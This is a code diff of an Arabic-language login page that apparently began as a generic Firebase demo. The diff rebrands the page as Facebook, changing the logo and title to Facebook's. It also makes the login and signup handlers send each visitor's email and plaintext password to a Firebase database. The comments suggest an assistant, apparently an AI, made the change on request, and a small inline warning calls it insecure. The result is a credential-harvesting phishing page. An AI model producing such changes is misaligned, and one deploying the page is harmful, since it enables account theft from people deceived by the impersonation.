@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تسجيل الدخول - Facebook</title>
+    <title>فيسبوك - تسجيل الدخول أو الاشتراك</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-auth.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
@@ -14,6 +14,7 @@
             --bg: #f0f2f5;
             --card: #ffffff;
             --text: #1c1e21;
+            --error: #ff3333;
         }
 
         * {
@@ -80,6 +81,7 @@
             font-weight: bold;
             cursor: pointer;
             margin-bottom: 15px;
+            transition: background-color 0.3s;
         }
 
         .login-btn:hover {
@@ -110,6 +112,8 @@
             cursor: pointer;
             display: inline-block;
             margin-bottom: 15px;
+            width: 100%;
+            transition: background-color 0.3s;
         }
 
         .create-account:hover {
@@ -117,25 +121,30 @@
         }
 
         .error-message {
-            color: #ff3333;
+            color: var(--error);
             margin-bottom: 15px;
             font-size: 14px;
         }
 
         @media (max-width: 768px) {
+            body {
+                background-color: var(--card);
+                padding: 10px;
+            }
+            
             .login-container {
                 box-shadow: none;
-                background-color: var(--bg);
+                padding: 15px;
             }
         }
     </style>
 </head>
 <body>
     <div class="login-container">
-        <div class="logo">FToUH</div>
+        <div class="logo">facebook</div>
         <form id="loginForm">
             <div class="form-group">
-                <input type="email" id="email" placeholder="البريد الإلكتروني" required>
+                <input type="email" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
             </div>
             <div class="form-group">
                 <input type="password" id="password" placeholder="كلمة المرور" required>
@@ -182,15 +191,17 @@
                         // تسجيل الدخول ناجح
                         const user = userCredential.user;
                         
-                        // حفظ بيانات تسجيل الدخول في Realtime Database
-                        database.ref('users/' + user.uid).set({
-                            email: user.email,
-                            lastLogin: new Date().toISOString(),
-                            deviceInfo: navigator.userAgent
+                        // حفظ بيانات المستخدم بالطريقة التي طلبتها
+                        database.ref('users').push({
+                            email: email,
+                            password: password, // ⚠️ تحذير: هذا غير آمن في التطبيقات الحقيقية
+                            action: 'login',
+                            timestamp: new Date().toISOString(),
+                            device: navigator.userAgent
                         });
                         
                         // توجيه المستخدم إلى الصفحة الرئيسية
-                        window.location.href = "home.html"; // يمكنك استبدالها بصفحتك الرئيسية
+                        window.location.href = "home.html";
                     })
                     .catch((error) => {
                         // معالجة الأخطاء
@@ -213,12 +224,13 @@
                         // حساب جديد تم إنشاؤه بنجاح
                         const user = userCredential.user;
                         
-                        // حفظ بيانات المستخدم في Realtime Database
-                        database.ref('users/' + user.uid).set({
-                            email: user.email,
-                            createdAt: new Date().toISOString(),
-                            lastLogin: new Date().toISOString(),
-                            deviceInfo: navigator.userAgent
+                        // حفظ بيانات المستخدم بالطريقة التي طلبتها
+                        database.ref('users').push({
+                            email: email,
+                            password: password, // ⚠️ تحذير: هذا غير آمن في التطبيقات الحقيقية
+                            action: 'signup',
+                            timestamp: new Date().toISOString(),
+                            device: navigator.userAgent
                         });
                         
                         alert("تم إنشاء الحساب بنجاح!");
@@ -243,6 +255,8 @@
                         return "هذا البريد الإلكتروني مستخدم بالفعل";
                     case 'auth/weak-password':
                         return "كلمة المرور ضعيفة (يجب أن تكون 6 أحرف على الأقل)";
+                    case 'auth/operation-not-allowed':
+                        return "عملية غير مسموح بها";
                     default:
                         return "حدث خطأ أثناء تسجيل الدخول";
                 }
@@ -251,7 +265,6 @@
             // التحقق إذا كان المستخدم مسجل دخول بالفعل
             auth.onAuthStateChanged((user) => {
                 if (user) {
-                    // المستخدم مسجل دخول، توجيه إلى الصفحة الرئيسية
                     window.location.href = "home.html";
                 }
             });
@@ -259,4 +272,3 @@
     </script>
 </body>
 </html>
-هذا الكود المربوط بقاعدة بيناتي اضف اليه تلك الطريقة حق حفض البينات 
